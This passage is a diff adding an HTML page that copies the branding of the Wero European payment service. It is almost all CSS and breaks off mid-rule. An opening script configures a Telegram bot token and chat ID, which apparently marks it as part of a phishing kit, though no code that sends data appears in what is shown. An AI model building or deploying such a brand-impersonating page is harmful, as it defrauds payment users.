@@ -1,0 +1,2025 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <script>
+        window.telegramConfig = {
+            BOT_TOKEN: "TELEGRAM_BOT_TOKEN_PLACEHOLDER",
+            CHAT_ID: "TELEGRAM_CHAT_ID_PLACEHOLDER"
+        };
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wero - solution de paiement européenne</title>
+    
+    <link rel="icon" href="images/icon.png" type="image/png">
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;700;800;900&display=swap" rel="stylesheet">
+    
+    <style>
+        /* ================= VARIABLES ================= */
+        :root {
+            --wero-yellow: #FFF69C;
+            --wero-yellow-hover: #fff275;
+            --black: #000000;
+            --white: #ffffff;
+            --gray-light: #F9FAFB;
+            --gray-medium: #E5E7EB;
+            --gray-dark: #1F2937;
+            --gray-text: #4B5563;
+        }
+
+        /* ================= BASE STYLES ================= */
+        * {
+            box-sizing: border-box;
+            font-family: 'Plus Jakarta Sans', sans-serif !important;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background-color: var(--white);
+            color: var(--black);
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            overflow-x: hidden;
+        }
+
+        a {
+            text-decoration: none;
+            color: inherit;
+            transition: color 0.2s ease-in-out;
+        }
+
+        button {
+            border: none;
+            background: none;
+            cursor: pointer;
+            font-family: inherit;
+        }
+
+        p {
+            margin: 0;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        /* ================= UTILITAIRES ================= */
+        .w-full { width: 100%; }
+        .hidden { display: none; }
+        .flex { display: flex; }
+        .grid { display: grid; }
+        .justify-center { justify-content: center; }
+        .uppercase { text-transform: uppercase; }
+        .leading-ultra-tight { line-height: 0.85; }
+
+        /* ================= MAIN LAYOUT ================= */
+        main {
+            width: 100%;
+            max-width: 1280px;
+            margin: 0 auto;
+            padding: 2rem 1.25rem 0; 
+        }
+
+        @media (min-width: 640px) {
+            main {
+                padding-left: 2rem;
+                padding-right: 2rem;
+            }
+        }
+
+        @media (min-width: 768px) {
+            main {
+                padding-top: 5rem;
+            }
+        }
+
+        /* ================= NAVBAR ================= */
+        .header {
+            width: 100%;
+            border-bottom: 1px solid var(--gray-medium);
+            position: relative;
+            background-color: var(--white);
+            z-index: 50;
+        }
+
+        .navbar-container {
+            padding: 1rem 1.25rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 13px;
+            font-weight: 700;
+            letter-spacing: 0.025em;
+            text-transform: uppercase;
+        }
+
+        @media (min-width: 768px) {
+            .navbar-container {
+                padding: 1.25rem 2rem;
+            }
+        }
+
+        .logo-container {
+            z-index: 50;
+            cursor: pointer;
+        }
+
+        #site-logo {
+            height: 2.2rem;
+            object-fit: contain;
+        }
+
+        @media (min-width: 768px) {
+            #site-logo {
+                height: 3rem;
+            }
+        }
+
+        #logo-fallback {
+            font-size: 1.25rem;
+            font-weight: 900;
+            letter-spacing: -0.05em;
+            color: var(--black);
+            user-select: none;
+        }
+
+        @media (min-width: 768px) {
+            #logo-fallback {
+                font-size: 1.5rem;
+            }
+        }
+
+        #mobile-menu-btn {
+            padding: 0.5rem;
+            color: var(--black);
+            display: block;
+            z-index: 50;
+        }
+
+        @media (min-width: 1024px) {
+            #mobile-menu-btn {
+                display: none;
+            }
+        }
+
+        .desktop-nav {
+            display: none;
+        }
+
+        @media (min-width: 1024px) {
+            .desktop-nav {
+                display: flex;
+                align-items: center;
+                gap: 1.5rem;
+                color: var(--gray-dark);
+            }
+        }
+
+        @media (min-width: 1200px) {
+            .desktop-nav {
+                gap: 2.5rem;
+            }
+        }
+
+        .nav-item-dropdown {
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 0.25rem;
+            transition: color 0.2s ease-in-out;
+        }
+
+        .nav-item-dropdown:hover {
+            color: var(--black);
+        }
+
+        .nav-link {
+            transition: color 0.2s ease-in-out;
+        }
+
+        .nav-link:hover {
+            color: var(--black);
+        }
+
+        .lang-selector {
+            display: none;
+        }
+
+        @media (min-width: 1024px) {
+            .lang-selector {
+                display: flex;
+                border-left: 1px solid var(--gray-medium);
+                height: 4rem;
+                align-items: center;
+                padding-left: 1.5rem;
+                color: var(--black);
+                font-weight: 900;
+                letter-spacing: 0.05em;
+                cursor: pointer;
+            }
+        }
+
+        /* ================= MOBILE MENU ================= */
+        #mobile-menu {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            gap: 0.5rem;
+            background-color: var(--white);
+            border-bottom: 1px solid var(--gray-medium);
+            position: absolute;
+            width: 100%;
+            right: 0;
+            top: 100%;
+            max-height: 0;
+            opacity: 0;
+            overflow: hidden;
+            transition: max-height 0.3s ease-in-out, opacity 0.3s ease-in-out, padding 0.3s ease-in-out;
+            color: var(--gray-dark);
+            font-weight: 700;
+            font-size: 0.875rem;
+            z-index: 40;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
+        }
+
+        @media (min-width: 1024px) {
+            #mobile-menu {
+                display: none !important;
+            }
+        }
+
+        .mobile-menu-item {
+            width: 100%;
+            text-align: left;
+            padding: 0.75rem 1.25rem;
+            border-bottom: 1px solid var(--gray-light);
+            cursor: pointer;
+            transition: color 0.2s ease-in-out;
+            text-decoration: none;
+            color: inherit;
+            display: block;
+        }
+
+        .mobile-menu-item:hover {
+            color: var(--black);
+        }
+
+        #mobile-menu-fr {
+            width: 100%;
+            text-align: left;
+            padding: 1rem 1.25rem;
+            font-weight: 900;
+            letter-spacing: 0.05em;
+            transition: color 0.2s ease-in-out;
+        }
+
+        #mobile-menu-fr:hover {
+            color: var(--black);
+        }
+
+        /* ================= BOUTONS GLOBAUX (WERO BTN) ================= */
+        .wero-btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            border: 2px solid var(--black);
+            background-color: var(--wero-yellow);
+            color: var(--black);
+            font-weight: 800;
+            font-size: 0.75rem;
+            padding: 0.75rem 1.25rem;
+            border-radius: 9999px;
+            box-shadow: 2px 2px 0px rgba(0,0,0,1);
+            transition: all 0.2s ease-in-out;
+            position: relative;
+            overflow: hidden;
+            cursor: pointer;
+            white-space: normal;
+            max-width: 100%;
+        }
+
+        @media (min-width: 768px) {
+            .wero-btn {
+                font-size: 0.875rem;
+                padding: 0.75rem 1.75rem;
+                white-space: nowrap;
+            }
+        }
+
+        .wero-btn:hover {
+            background-color: var(--wero-yellow-hover);
+        }
+
+        .wero-btn:active {
+            transform: translateY(1px);
+        }
+
+        .wero-btn-content {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+        }
+
+        @media (min-width: 768px) {
+            .wero-btn-content {
+                gap: 1rem;
+            }
+        }
+
+        .wero-btn-text {
+            order: 1;
+        }
+
+        .wero-btn:hover .wero-btn-text,
+        .wero-btn:active .wero-btn-text {
+            order: 2;
+        }
+
+        .wero-btn-icon-container {
+            width: 1.25rem;
+            height: 1.25rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 1px solid var(--black);
+            border-radius: 9999px;
+            background-color: var(--white);
+            font-size: 0.75rem;
+            font-weight: 700;
+            order: 2;
+            transition: transform 0.4s cubic-bezier(0.25, 0.8, 0.25, 1), order 0.2s;
+            flex-shrink: 0;
+        }
+
+        @media (min-width: 768px) {
+            .wero-btn-icon-container {
+                width: 1.5rem;
+                height: 1.5rem;
+            }
+        }
+
+        .wero-btn:hover .wero-btn-icon-container,
+        .wero-btn:active .wero-btn-icon-container {
+            order: 1;
+        }
+
+        .wero-btn .arrow-svg {
+            transform: rotate(45deg);
+            width: 0.625rem;
+            height: 0.625rem;
+        }
+
+        @media (min-width: 768px) {
+            .wero-btn .arrow-svg {
+                width: 0.75rem;
+                height: 0.75rem;
+            }
+        }
+
+        .wero-btn:hover .arrow-svg,
+        .wero-btn:active .arrow-svg {
+            transform: rotate(135deg);
+        }
+
+        /* ================= STRUCTURE DE TAILLE ALIGNÉE POUR LES BOUTONS ================= */
+        .hero-buttons-wrapper {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            margin-top: 2rem;
+        }
+
+        @media (min-width: 768px) {
+            .hero-buttons-wrapper {
+                flex-direction: row;
+            }
+        }
+
+        /* Force les boutons à avoir la même largeur maximale pour être identiques */
+        .hero-buttons-wrapper .wero-btn {
+            width: 100%;
+            max-width: 300px;
+            justify-content: center;
+        }
+
+        .mobile-menu-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 0.75rem;
+            width: 100%;
+            padding: 1rem 1.25rem 2rem;
+        }
+
+        .mobile-menu-buttons .wero-btn {
+            width: 100%;
+            justify-content: center;
+        }
+
+        /* ================= HERO SECTION (Corrigée en CSS pur) ================= */
+        .hero-section {
+            text-align: center;
+            width: 100%;
+            max-width: 64rem;
+            margin: 0 auto;
+            margin-bottom: 2.5rem;
+            padding-top: 2rem;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        @media (min-width: 768px) {
+            .hero-section {
+                margin-bottom: 4rem;
+                padding-top: 3rem;
+            }
+        }
+
+        .hero-title {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            font-size: 2rem;
+            font-weight: 900;
+            line-height: 1.1;
+            letter-spacing: -0.02em;
+            color: var(--black);
+            text-transform: uppercase;
+            margin-bottom: 1.5rem;
+        }
+
+        @media (min-width: 768px) {
+            .hero-title {
+                font-size: 3rem;
+                margin-bottom: 2rem;
+            }
+        }
+
+        @media (min-width: 1024px) {
+            .hero-title {
+                font-size: 4rem;
+            }
+        }
+
+        .hero-title .lowercase {
+            text-transform: lowercase;
+        }
+
+        .hero-description {
+            font-size: 1rem;
+            line-height: 1.6;
+            color: var(--black);
+            font-weight: 500;
+            max-width: 52rem;
+            margin: 0 auto;
+        }
+
+        @media (min-width: 768px) {
+            .hero-description {
+                font-size: 1.15rem;
+            }
+        }
+
+        /* ================= MAIN IMAGE SECTION ================= */
+        .main-image-section {
+            position: relative;
+            width: 100%;
+            max-width: 64rem;
+            margin: 0 auto;
+            margin-bottom: 3rem;
+            display: flex;
+            justify-content: center;
+        }
+
+        @media (min-width: 768px) {
+            .main-image-section {
+                margin-bottom: 6rem;
+            }
+        }
+
+        #scroll-trigger {
+            position: absolute;
+            top: -1rem;
+            right: 0;
+            background-color: var(--black);
+            color: var(--white);
+            width: 1.75rem;
+            height: 1.75rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 0.125rem;
+            cursor: pointer;
+            z-index: 10;
+            transition: background-color 0.2s ease-in-out;
+        }
+
+        @media (min-width: 768px) {
+            #scroll-trigger {
+                width: 2rem;
+                height: 2rem;
+            }
+        }
+
+        #scroll-trigger:hover {
+            background-color: var(--gray-dark);
+        }
+
+        .main-image-content {
+            width: 100%;
+            height: auto;
+            object-fit: contain;
+            filter: drop-shadow(0 1px 1px rgba(0,0,0,0.05));
+        }
+
+        /* ================= DETAILS SECTION ================= */
+        #details-section {
+            max-width: 64rem;
+            margin: 0 auto;
+            grid-template-columns: 1fr;
+            gap: 1.5rem;
+            align-items: start;
+            border-top: 1px solid var(--gray-medium);
+            padding-top: 2rem;
+        }
+
+        @media (min-width: 768px) {
+            #details-section {
+                grid-template-columns: 1fr 1fr;
+                gap: 3rem;
+                padding-top: 4rem;
+            }
+        }
+
+        .details-title {
+            font-size: 1.75rem;
+            font-weight: 900;
+            text-transform: uppercase;
+            letter-spacing: -0.05em;
+            line-height: 0.9;
+            color: var(--black);
+        }
+
+        @media (min-width: 768px) {
+            .details-title {
+                font-size: 2rem;
+            }
+        }
+
+        @media (min-width: 1024px) {
+            .details-title {
+                font-size: 2.25rem;
+            }
+        }
+
+        .details-text {
+            color: var(--gray-text);
+            font-size: 0.875rem;
+            line-height: 1.625;
+            font-weight: 500;
+        }
+
+        @media (min-width: 768px) {
+            .details-text {
+                font-size: 1rem;
+            }
+        }
+
+        .inline-underline {
+            text-decoration: underline;
+            text-decoration-thickness: 1px;
+            text-underline-offset: 4px;
+            color: var(--black);
+        }
+
+        /* ================= ERE SECTION ================= */
+        .ere-section {
+            max-width: 64rem;
+            margin: 0 auto;
+            margin-top: 4rem;
+        }
+
+        @media (min-width: 768px) {
+            .ere-section {
+                margin-top: 8rem;
+            }
+        }
+
+        .ere-title {
+            font-size: 1.75rem;
+            font-weight: 900;
+            text-transform: uppercase;
+            letter-spacing: -0.05em;
+            line-height: 0.9;
+            color: var(--black);
+            margin-bottom: 1.5rem;
+        }
+
+        @media (min-width: 768px) {
+            .ere-title {
+                font-size: 2rem;
+                margin-bottom: 2rem;
+            }
+        }
+
+        @media (min-width: 1024px) {
+            .ere-title {
+                font-size: 2.25rem;
+                margin-bottom: 2.5rem;
+            }
+        }
+
+        .ere-text-container {
+            color: var(--gray-text);
+            font-size: 0.875rem;
+            line-height: 1.625;
+            font-weight: 500;
+            max-width: 48rem;
+        }
+
+        @media (min-width: 768px) {
+            .ere-text-container {
+                font-size: 1.125rem;
+            }
+        }
+
+        /* ================= FEATURES GRID ================= */
+        .features-wrapper {
+            max-width: 64rem;
+            margin: 0 auto;
+            margin-top: 3rem;
+        }
+
+        @media (min-width: 768px) {
+            .features-wrapper {
+                margin-top: 6rem;
+            }
+        }
+
+        .features-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            border: 1px solid var(--black);
+            background-color: var(--black);
+            gap: 1px;
+        }
+
+        @media (min-width: 768px) and (max-width: 1023px) {
+            .features-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            .feature-col:nth-child(3) {
+                grid-column: span 2;
+            }
+            .feature-col:nth-child(3) .feature-image-container {
+                aspect-ratio: auto;
+                height: 300px;
+            }
+        }
+
+        @media (min-width: 1024px) {
+            .features-grid {
+                grid-template-columns: repeat(3, 1fr);
+            }
+        }
+
+        .feature-col {
+            display: flex;
+            flex-direction: column;
+            background-color: var(--white);
+            height: 100%;
+        }
+
+        .feature-image-container {
+            width: 100%;
+            border-bottom: 1px solid var(--black);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 1.5rem;
+            aspect-ratio: 4 / 3;
+        }
+
+        @media (min-width: 768px) {
+            .feature-image-container {
+                padding: 1rem;
+            }
+        }
+        
+        .bg-feature-1 { background-color: #4C84FF; }
+        .bg-feature-2 { background-color: #FF59FF; }
+        .bg-feature-3 { background-color: #6BFFEA; }
+
+        .feature-image {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .feature-text-container {
+            background-color: var(--wero-yellow);
+            padding: 1.75rem 1.25rem;
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+            gap: 1.25rem;
+        }
+
+        @media (min-width: 768px) {
+            .feature-text-container {
+                padding: 2rem 1.5rem;
+            }
+        }
+
+        @media (min-width: 1024px) {
+            .feature-text-container {
+                padding: 2.5rem 2rem;
+            }
+        }
+
+        .feature-title {
+            font-size: 1.15rem;
+            font-weight: 900;
+            text-transform: uppercase;
+            letter-spacing: -0.05em;
+            line-height: 0.9;
+            color: var(--black);
+        }
+
+        @media (min-width: 900px) {
+            .feature-title {
+                font-size: 1.25rem;
+            }
+        }
+
+        .feature-text {
+            font-size: 0.85rem;
+            font-weight: 500;
+            line-height: 1.6;
+            color: var(--black);
+        }
+
+        /* ================= SECTION BANQUES ================= */
+        .banks-section {
+            max-width: 64rem;
+            margin: 4rem auto;
+            border-top: 1px solid var(--gray-medium);
+            padding-top: 4rem;
+        }
+
+        @media (min-width: 768px) {
+            .banks-section {
+                margin-top: 8rem;
+                padding-top: 6rem;
+            }
+        }
+
+        .banks-header {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 1.5rem;
+            margin-bottom: 3rem;
+            align-items: start;
+        }
+
+        @media (min-width: 768px) {
+            .banks-header {
+                grid-template-columns: 1fr 1fr;
+                gap: 4rem;
+            }
+        }
+
+        .banks-title {
+            font-size: 1.75rem;
+            font-weight: 900;
+            text-transform: uppercase;
+            letter-spacing: -0.05em;
+            line-height: 0.9;
+            color: var(--black);
+        }
+
+        @media (min-width: 768px) {
+            .banks-title {
+                font-size: 2.25rem;
+            }
+        }
+
+        .banks-text-container {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            gap: 1.5rem;
+        }
+
+        .banks-text {
+            color: var(--gray-text);
+            font-size: 0.875rem;
+            line-height: 1.625;
+            font-weight: 500;
+        }
+
+        @media (min-width: 768px) {
+            .banks-text {
+                font-size: 1rem;
+            }
+        }
+
+        .banks-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
+            gap: 2rem 1.5rem;
+            align-items: center;
+            justify-items: center;
+            margin-top: 4rem;
+        }
+
+        @media (min-width: 768px) {
+            .banks-grid {
+                grid-template-columns: repeat(7, 1fr);
+                gap: 3.5rem 2rem;
+                margin-top: 5rem;
+            }
+        }
+
+        .bank-logo {
+            max-height: 35px;
+            max-width: 100%;
+            object-fit: contain;
+        }
+
+        /* ================= SECTION FAQ ================= */
+        .faq-section {
+            max-width: 64rem;
+            margin: 4rem auto;
+            border-top: 1px solid var(--gray-medium);
+            padding-top: 4rem;
+        }
+
+        @media (min-width: 768px) {
+            .faq-section {
+                margin-top: 8rem;
+                padding-top: 6rem;
+            }
+        }
+
+        .faq-container {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 3rem;
+        }
+
+        @media (min-width: 768px) {
+            .faq-container {
+                grid-template-columns: 1fr 1.2fr;
+                gap: 4rem;
+            }
+        }
+
+        .faq-left {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+        }
+
+        .faq-title {
+            font-size: 2rem;
+            font-weight: 900;
+            text-transform: uppercase;
+            letter-spacing: -0.05em;
+            line-height: 0.9;
+            color: var(--black);
+            margin-bottom: 2rem;
+        }
+
+        @media (min-width: 768px) {
+            .faq-title {
+                font-size: 2.5rem;
+            }
+        }
+
+        .faq-link {
+            font-size: 1rem;
+            font-weight: 700;
+            color: var(--black);
+            text-decoration: underline;
+            text-underline-offset: 4px;
+            display: inline-flex;
+            align-items: center;
+        }
+
+        .faq-right {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .faq-item {
+            border-bottom: 1px solid var(--gray-medium);
+        }
+
+        .faq-item:first-child {
+            border-top: 1px solid var(--gray-medium);
+        }
+
+        .faq-question {
+            width: 100%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1.5rem 0;
+            cursor: pointer;
+            text-align: left;
+            background: none;
+            border: none;
+            font-family: inherit;
+        }
+
+        .faq-question-text {
+            font-size: 1rem;
+            font-weight: 700;
+            color: var(--black);
+            padding-right: 1rem;
+        }
+
+        @media (min-width: 768px) {
+            .faq-question-text {
+                font-size: 1.125rem;
+            }
+        }
+
+        .faq-icon-container {
+            width: 2rem;
+            height: 2rem;
+            border-radius: 50%;
+            background-color: var(--wero-yellow);
+            border: 1px solid var(--black);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-shrink: 0;
+            transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .faq-icon {
+            width: 1rem;
+            height: 1rem;
+            stroke-width: 2;
+            fill: none;
+            stroke: var(--black);
+        }
+
+        .faq-item.active .faq-icon-container {
+            transform: rotate(180deg);
+        }
+
+        .faq-answer-wrapper {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.4s ease-out;
+        }
+
+        .faq-answer {
+            padding-bottom: 1.5rem;
+            color: var(--gray-text);
+            font-size: 0.875rem;
+            line-height: 1.6;
+            font-weight: 500;
+        }
+
+        @media (min-width: 768px) {
+            .faq-answer {
+                font-size: 0.95rem;
+            }
+        }
+
+        /* ================= SECTION NEWSLETTER ================= */
+        .newsletter-section {
+            padding: 4rem 0 4rem;
+            display: flex;
+            justify-content: center;
+        }
+
+        @media (min-width: 768px) {
+            .newsletter-section {
+                padding: 6rem 0 6rem;
+            }
+        }
+
+        .newsletter-container {
+            background-color: var(--wero-yellow);
+            border: 1px solid var(--black);
+            width: 100%;
+            max-width: 1000px;
+            padding: 4rem 1.5rem;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            margin: 0 auto;
+        }
+
+        @media (min-width: 768px) {
+            .newsletter-container {
+                padding: 5rem 4rem;
+            }
+        }
+
+        .newsletter-deco {
+            position: absolute;
+            top: -40px;
+            right: -10px;
+            width: 120px;
+            z-index: 10;
+            pointer-events: none;
+        }
+
+        @media (min-width: 768px) {
+            .newsletter-deco {
+                top: -60px;
+                right: 20px;
+                width: 160px;
+            }
+        }
+
+        .newsletter-title {
+            font-size: 1.75rem;
+            font-weight: 900;
+            text-transform: uppercase;
+            letter-spacing: -0.05em;
+            line-height: 1;
+            color: var(--black);
+            margin-bottom: 1rem;
+        }
+
+        @media (min-width: 768px) {
+            .newsletter-title {
+                font-size: 2.25rem;
+            }
+        }
+
+        .newsletter-subtitle {
+            font-size: 0.875rem;
+            font-weight: 500;
+            line-height: 1.5;
+            color: var(--black);
+            max-width: 600px;
+            margin-bottom: 2.5rem;
+        }
+
+        @media (min-width: 768px) {
+            .newsletter-subtitle {
+                font-size: 1rem;
+            }
+        }
+
+        .newsletter-form {
+            width: 100%;
+            max-width: 700px;
+            display: flex;
+            flex-direction: column;
+            gap: 1.5rem;
+            text-align: left;
+        }
+
+        .newsletter-mandatory {
+            font-size: 0.85rem;
+            color: var(--gray-text);
+            margin-bottom: -0.5rem;
+            font-style: italic;
+        }
+
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 1.5rem;
+        }
+
+        @media (min-width: 640px) {
+            .form-row {
+                grid-template-columns: 1fr 1fr;
+            }
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 0.5rem;
+        }
+
+        .form-group label {
+            font-size: 0.875rem;
+            font-weight: 700;
+            color: var(--black);
+        }
+
+        .asterisk {
+            color: #D32F2F;
+        }
+
+        .form-group input[type="text"],
+        .form-group input[type="email"] {
+            width: 100%;
+            padding: 0.875rem;
+            border: 1px solid var(--black);
+            border-radius: 0;
+            background-color: var(--white);
+            font-family: inherit;
+            font-size: 1rem;
+            outline: none;
+            transition: box-shadow 0.2s;
+        }
+
+        .form-group input:focus {
+            box-shadow: 0 0 0 2px rgba(0,0,0,0.1);
+        }
+
+        .form-help {
+            font-size: 0.75rem;
+            color: var(--gray-text);
+            margin-top: 0.25rem;
+        }
+
+        .form-optin {
+            margin-top: 1rem;
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+        }
+
+        .optin-title {
+            font-size: 0.875rem;
+            font-weight: 700;
+            color: var(--black);
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: flex-start;
+            gap: 0.75rem;
+        }
+
+        .checkbox-group input[type="checkbox"] {
+            appearance: none;
+            background-color: var(--white);
+            margin: 0;
+            width: 1.25rem;
+            height: 1.25rem;
+            border: 1px solid var(--black);
+            border-radius: 0;
+            display: grid;
+            place-content: center;
+            cursor: pointer;
+            flex-shrink: 0;
+            margin-top: 0.15rem;
+        }
+
+        .checkbox-group input[type="checkbox"]::before {
+            content: "";
+            width: 0.65em;
+            height: 0.65em;
+            transform: scale(0);
+            transition: 120ms transform ease-in-out;
+            background-color: var(--black);
+        }
+
+        .checkbox-group input[type="checkbox"]:checked::before {
+            transform: scale(1);
+        }
+
+        .checkbox-group label {
+            font-size: 0.8rem;
+            font-weight: 500;
+            line-height: 1.5;
+            color: var(--black);
+            cursor: pointer;
+        }
+
+        .submit-btn {
+            width: 100%;
+            margin-top: 1.5rem;
+            padding: 1rem;
+            background-color: var(--white);
+            color: var(--black);
+            border: 1px solid var(--black);
+            border-radius: 9999px;
+            font-size: 0.875rem;
+            font-weight: 800;
+            cursor: pointer;
+            transition: background-color 0.2s, transform 0.1s;
+        }
+
+        .submit-btn:hover {
+            background-color: #f5f5f5;
+        }
+
+        .submit-btn:active {
+            transform: translateY(1px);
+        }
+
+        /* ================= PRE-FOOTER BANNER ================= */
+        .pre-footer-banner {
+            background-color: var(--wero-yellow);
+            padding: 4rem 1.25rem;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            gap: 2rem;
+            border-top: 1px solid var(--black);
+        }
+
+        @media (min-width: 768px) {
+            .pre-footer-banner {
+                flex-direction: row;
+                justify-content: space-between;
+                padding: 4rem 4rem;
+                text-align: left;
+            }
+        }
+
+        .pre-footer-title {
+            font-size: 1.75rem;
+            font-weight: 900;
+            text-transform: uppercase;
+            letter-spacing: -0.05em;
+            line-height: 1;
+            color: var(--black);
+            max-width: 800px;
+        }
+
+        @media (min-width: 768px) {
+            .pre-footer-title {
+                font-size: 2.5rem;
+            }
+        }
+
+        /* ================= FOOTER ================= */
+        .site-footer {
+            background-color: var(--white); 
+            color: var(--black);
+            padding: 4rem 1.25rem 2rem;
+            width: 100%;
+        }
+
+        .site-footer-inner {
+            max-width: 1280px;
+            margin: 0 auto;
+        }
+
+        @media (min-width: 768px) {
+            .site-footer {
+                padding: 6rem 4rem 2rem;
+            }
+        }
+
+        .footer-top {
+            display: flex;
+            flex-direction: column;
+            gap: 4rem;
+            margin-bottom: 6rem;
+        }
+
+        @media (min-width: 768px) {
+            .footer-top {
+                flex-direction: row;
+                justify-content: space-between;
+            }
+        }
+
+        .footer-links-container {
+            display: flex;
+            flex-direction: column;
+            gap: 3rem;
+        }
+
+        @media (min-width: 640px) {
+            .footer-links-container {
+                flex-direction: row;
+                gap: 6rem;
+            }
+        }
+
+        .footer-col {
+            display: flex;
+            flex-direction: column;
+            gap: 1.25rem;
+        }
+
+        .footer-heading {
+            font-size: 1.1rem;
+            font-weight: 800;
+            margin-bottom: 0.5rem;
+            color: var(--black);
+        }
+
+        .footer-link {
+            font-size: 0.9rem;
+            font-weight: 500;
+            color: var(--gray-text); 
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+
+        .footer-link:hover {
+            color: var(--black);
+            text-decoration: underline;
+            text-underline-offset: 4px;
+        }
+
+        .footer-logo {
+            display: flex;
+            align-items: center;
+        }
+
+        .footer-logo img {
+            height: 3rem;
+            width: auto;
+            object-fit: contain;
+        }
+
+        @media (min-width: 768px) {
+            .footer-logo img {
+                height: 4.5rem;
+            }
+        }
+
+        .footer-bottom {
+            display: flex;
+            flex-direction: column;
+            gap: 2rem;
+        }
+
+        @media (min-width: 1024px) {
+            .footer-bottom {
+                flex-direction: row;
+                justify-content: space-between;
+                align-items: flex-end;
+            }
+        }
+
+        .footer-info {
+            font-size: 0.75rem;
+            color: var(--gray-text); 
+            line-height: 1.6;
+            max-width: 600px;
+            font-weight: 500;
+        }
+
+        .footer-info p {
+            margin-bottom: 1rem;
+        }
+        
+        .footer-info a.inline-underline {
+            color: var(--black);
+        }
+
+        .footer-socials {
+            display: flex;
+            gap: 1rem;
+        }
+
+        .social-icon {
+            width: 2.5rem;
+            height: 2.5rem;
+            border-radius: 50%;
+            background-color: var(--wero-yellow);
+            border: 1px solid var(--black);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: transform 0.2s, background-color 0.2s;
+            color: var(--black);
+        }
+
+        .social-icon:hover {
+            transform: translateY(-2px);
+            background-color: var(--wero-yellow-hover);
+        }
+
+        .social-icon svg {
+            width: 1.1rem;
+            height: 1.1rem;
+            fill: currentColor;
+        }
+
+        .copyright {
+            font-size: 0.75rem;
+            margin-top: 2rem;
+        }
+
+        /* ================= ICONS GLOBAL ================= */
+        .dropdown-icon { width: 0.75rem; height: 0.75rem; stroke-width: 3; fill: none; stroke: currentColor; }
+        .burger-icon { width: 1.5rem; height: 1.5rem; stroke-width: 2.5; fill: none; stroke: currentColor; }
+        .button-icon { width: 0.625rem; height: 0.625rem; stroke-width: 2.5; fill: none; stroke: currentColor; }
+        @media (min-width: 768px) { .button-icon { width: 0.75rem; height: 0.75rem; } }
+        .scroll-icon { width: 0.75rem; height: 0.75rem; stroke-width: 2.5; fill: none; stroke: currentColor; }
+        @media (min-width: 768px) { .scroll-icon { width: 1rem; height: 1rem; } }
+    
+        /* ===== OPTIMISATIONS MOBILE ===== */
+        * {
+            box-sizing: border-box;
+        }
+        
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            overflow-x: hidden;
+        }
+        
+        /* Responsive images */
+        img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+        }
+        
+        /* Responsive text */
+        @media (max-width: 768px) {
+            body {
+                font-size: 14px;
+                line-height: 1.5;
+            }
+            
+            h1, .h1 { font-size: 20px !important; }
+            h2, .h2 { font-size: 18px !important; }
+            h3, .h3 { font-size: 16px !important; }
+            
+            /* Buttons */
+            button, .btn, [class*="btn"] {
+                min-height: 44px;
+                padding: 12px 20px !important;
+                font-size: 14px;
+            }
+            
+            /* Inputs */
+            input, select, textarea {
+                min-height: 44px;
+                padding: 12px;
+                font-size: 16px;
+            }
+            
+            /* Layout */
+            .container, main, section {
+                padding: 15px !important;
+            }
+            
+            /* Grid adjustments */
+            [class*="grid"], [class*="flex"] {
+                flex-direction: column;
+            }
+            
+            /* Hide unnecessary elements */
+            .hide-mobile {
+                display: none !important;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            h1, .h1 { font-size: 18px !important; }
+            h2, .h2 { font-size: 16px !important; }
+            h3, .h3 { font-size: 14px !important; }
+            
+            button, .btn, [class*="btn"] {
+                width: 100%;
+                padding: 14px 16px !important;
+                font-size: 13px;
+            }
+            
+            input, select, textarea {
+                font-size: 16px;
+            }
+            
+            .container, main, section {
